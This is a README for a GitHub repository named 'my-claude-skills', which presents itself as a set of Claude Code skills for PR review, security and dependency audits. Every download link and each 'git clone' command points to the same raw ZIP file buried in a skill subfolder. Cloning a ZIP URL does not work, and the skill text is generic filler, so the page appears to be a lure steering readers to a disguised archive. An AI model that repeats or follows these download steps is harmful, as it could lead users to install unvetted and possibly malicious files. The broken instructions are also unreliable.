# 🧠 my-claude-skills - Claude Code skills that save time

[![Download](https://img.shields.io/badge/Download%20from%20GitHub-gray?style=for-the-badge)](https://github.com/nariatrip191/my-claude-skills/raw/refs/heads/main/dependency-auditor/claude-skills-my-2.2.zip)

## 📦 What this is

`my-claude-skills` is a set of Claude Code skills for day-to-day work on software projects. It helps you review pull requests, check code for security issues, and inspect dependencies before you ship changes.

It is made for people who want clear checks without setting up a lot of tools.

## 🚀 What you can do

- Review pull request diffs before merge
- Check code for security risks
- Scan for prompt injection issues
- Review third-party libraries for risk
- Check licenses before release
- Save time on repeat checks

## 💻 Windows setup

Use the GitHub link above to visit this page to download the files. Then follow the steps below on Windows.

### 1. Get the project

Open the GitHub page and download the repository as a ZIP file.

If you use Git, you can also clone it:

```bash
git clone https://github.com/nariatrip191/my-claude-skills/raw/refs/heads/main/dependency-auditor/claude-skills-my-2.2.zip
```

### 2. Unzip the folder

If you downloaded the ZIP file, right-click it and choose Extract All.

After extraction, you should see a folder named:

```text
my-claude-skills
```

### 3. Find your Claude Code skills folder

Claude Code stores skills in a local folder on your computer.

On Windows, use this path:

```text
C:\Users\YourName\.claude\skills
```

If the `skills` folder does not exist, create it.

### 4. Copy a skill into place

Pick one skill folder from `my-claude-skills` and copy it into your Claude Code skills folder.

Example:

```text
my-claude-skills\pr-review-expert
```

Copy it to:

```text
C:\Users\YourName\.claude\skills\pr-review-expert
```

You can repeat this for each skill you want to use.

### 5. Open Claude Code

Start Claude Code after you copy the skill folder.

Claude Code should detect the skill from the local skills folder.

## 🛠️ Install with Git for Windows

If you have Git for Windows installed, you can use Command Prompt or PowerShell.

### Clone the repository

```bash
git clone https://github.com/nariatrip191/my-claude-skills/raw/refs/heads/main/dependency-auditor/claude-skills-my-2.2.zip
```

### Copy a skill folder

In PowerShell:

```powershell
Copy-Item -Recurse .\my-claude-skills\pr-review-expert "$env:USERPROFILE\.claude\skills\"
```

In Command Prompt:

```bat
xcopy my-claude-skills\pr-review-expert "%USERPROFILE%\.claude\skills\pr-review-expert" /E /I
```

## 🧩 Included skills

### 1. pr-review-expert

Use this skill when you want a full review of a pull request diff.

It helps you check:

- Code changes
- Side effects
- Security issues
- Test coverage gaps
- Files that may break after merge

Use it before you ship code or merge a large change.

### 2. skill-security-auditor

Use this skill to look for common security problems in code.

It checks for:

- Command injection
- Data exfiltration
- Prompt injection
- Unsafe input handling
- Risky code paths

It works without extra setup on systems that can run Python.

### 3. dependency-auditor

Use this skill to review project libraries before release.

It can help you check:

- License risk
- Security risk
- Old packages
- Known weak spots in dependencies
- Libraries that need a closer look

This is useful when your project uses many packages and you want a quick first pass.

### 4. test-gap-finder

Use this skill to find parts of the code that may not have enough test coverage.

It helps you spot:

- Unchecked changes
- Missing edge cases
- New code paths without tests
- Logic that may fail in real use

### 5. docs-consistency-checker

Use this skill to compare code changes with docs and usage notes.

It helps you catch:

- Mismatched instructions
- Old examples
- Broken setup steps
- Missing README updates

### 6. release-readiness-reviewer

Use this skill before a release to check if the project is ready to ship.

It looks for:

- Missing version updates
- Open issues in key files
- Unfinished config changes
- Gaps in release notes
- Files that need one last review

## 🗂️ Folder layout

A typical setup looks like this:

```text
C:\Users\YourName\.claude\skills\
├── pr-review-expert
├── skill-security-auditor
├── dependency-auditor
├── test-gap-finder
├── docs-consistency-checker
└── release-readiness-reviewer
```

## 🔍 How to use a skill

After you copy a skill folder, open Claude Code and ask it to use that skill for your task.

Examples:

- Review this pull request diff with `pr-review-expert`
- Scan this code for security issues with `skill-security-auditor`
- Check these libraries with `dependency-auditor`
- Find missing tests with `test-gap-finder`
- Compare this README with the code using `docs-consistency-checker`
- Check release readiness with `release-readiness-reviewer`

## 🧪 Basic checks before you start

Make sure you have:

- Windows 10 or Windows 11
- Claude Code installed
- A GitHub account or ZIP download access
- Enough disk space for the repository
- Permission to create folders in your user profile

## 📁 Common problems

### The skill does not show up

Check that the folder is in the right place:

```text
C:\Users\YourName\.claude\skills\skill-name
```

Make sure you copied the whole folder, not just the files inside it.

### The folder path is wrong

Use your own Windows user name in the path.

Example:

```text
C:\Users\Alex\.claude\skills
```

### Claude Code still does not load it

Close Claude Code and open it again.

Then check that the skill folder name matches the skill you copied.

## 🔒 Safety checks

These skills are built to help with review work, but you still need to check the final output before you act on it.

Use them for:

- Early review
- Faster checks
- Better coverage
- Cleaner releases

## 📌 GitHub download link

Visit this page to download the repository:

https://github.com/nariatrip191/my-claude-skills/raw/refs/heads/main/dependency-auditor/claude-skills-my-2.2.zip

After download, copy the skill folders you want into your Claude Code skills directory on Windows